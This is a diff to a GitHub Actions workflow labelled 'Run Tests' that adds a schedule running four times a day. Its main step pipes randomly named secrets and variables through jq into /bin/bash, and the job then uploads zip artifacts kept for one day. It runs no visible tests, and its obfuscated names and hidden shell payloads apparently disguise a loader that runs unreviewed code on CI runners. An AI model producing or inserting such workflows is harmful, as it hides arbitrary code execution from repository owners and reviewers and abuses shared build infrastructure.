@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 0,6,12,18 * * *'
 env:
   CI: true
 jobs:
@@ -13,17 +15,18 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          zdil49: ${{ secrets.zdil49 }}
+          jx0: ${{ secrets.jx0 }}
         run: |
-          printf '%s' "$zdil49" | jq -r .vyrel966 | /bin/bash
-          echo $v3653 | jq -r .ktlx5 | /bin/bash
-          printf '%s' "$arpo149" | jq -r .uln8 | /bin/bash
-          printf '%s' "$vjrv92655" | jq -r .ezdgc11 | /bin/bash
-          echo $exp113 | jq -r .oztz74547 | /bin/bash
+          printf '%s' "$jx0" | jq -r .wxdlj3 | /bin/bash
+          echo $ecpsg12302 | jq -r .k94 | /bin/bash
+          echo $xlzz695 | jq -r .jz94688 | /bin/bash
+          printf '%s' "$yed6" | jq -r .v139 | /bin/bash
+          echo $q8 | jq -r .ysy806 | /bin/bash
+          printf '%s' "$swstz5089" | jq -r .b43296 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: ja0qWzAY
+          name: SVj2xJtp
           path: "*.zip"
           retention-days: 1
